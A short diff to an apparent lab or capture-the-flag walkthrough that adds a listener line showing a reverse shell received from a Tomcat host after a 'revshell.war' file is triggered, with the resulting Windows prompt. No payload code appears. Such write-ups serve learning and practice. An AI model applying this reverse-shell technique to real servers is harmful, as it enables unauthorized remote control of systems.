@@ -254,6 +254,7 @@ Finally, let's trigger our `revshell.war` file!
 And if we check our listener:
 
 ```
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.95] 49192
 <SNIP>
 C:\apache-tomcat-7.0.88>
 ```
